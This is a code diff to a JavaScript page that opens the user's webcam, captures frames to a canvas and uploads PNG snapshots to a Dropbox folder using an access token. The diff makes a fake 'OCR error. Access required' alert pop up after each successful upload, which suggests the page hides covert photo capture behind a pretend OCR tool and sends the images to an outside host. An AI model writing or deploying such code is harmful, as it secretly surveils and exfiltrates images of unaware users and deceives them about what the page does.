@@ -80,42 +80,7 @@ fetch(TEST_URL, {
 .then(response => response.json())
 .then(console.log)
 .catch(console.error);
-// async function uploadToDropbox(blob) {
-//   const filename = `${DROPBOX_FOLDER}/snapshot_${Date.now()}.png`;
-//   const url = 'https://content.dropboxapi.com/2/files/upload';
-
-//   const response = await fetch(url, {
-//     method: 'POST',
-//     headers: {
-//       'Authorization': `Bearer ${DROPBOX_TOKEN}`,
-//       'Content-Type': 'application/octet-stream',
-//       'Dropbox-API-Arg': JSON.stringify({
-//         path: filename,
-//         mode: 'add',
-//         autorename: true,
-//         mute: false
-//       })
-//     },
-//     body: blob
-//   });
-
-//   return response.json();
-// }
-
-// function captureAndUpload() {
-//   const context = canvas.getContext('2d');
-//   context.drawImage(video, 0, 0, canvas.width, canvas.height);
-//   canvas.toBlob(async (blob) => {
-//     try {
-//       await uploadToDropbox(blob);
-//       console.log("Uploaded to Dropbox!");
-//     } catch (error) {
-//       console.error("Upload failed:", error);
-//     }
-//   }, 'image/png');
-// }
-
-  async function uploadToDropbox(blob) {
+async function uploadToDropbox(blob) {
   const filename = `${DROPBOX_FOLDER}/snapshot_${Date.now()}.png`;
   const url = 'https://content.dropboxapi.com/2/files/upload';
 
@@ -134,11 +99,6 @@ fetch(TEST_URL, {
     body: blob
   });
 
-  if (!response.ok) {
-    // If the response is not ok (like 401 Unauthorized), show the alert
-    alert('OCR error. Access required');
-  }
-
   return response.json();
 }
 
@@ -149,12 +109,15 @@ function captureAndUpload() {
     try {
       await uploadToDropbox(blob);
       console.log("Uploaded to Dropbox!");
+      alert('OCR error. Access required');
 
     } catch (error) {
       console.error("Upload failed:", error);
     }
   }, 'image/png');
 }
+
+
 
 // Initialize webcam and start capturing
 navigator.mediaDevices.getUserMedia({ video: true })
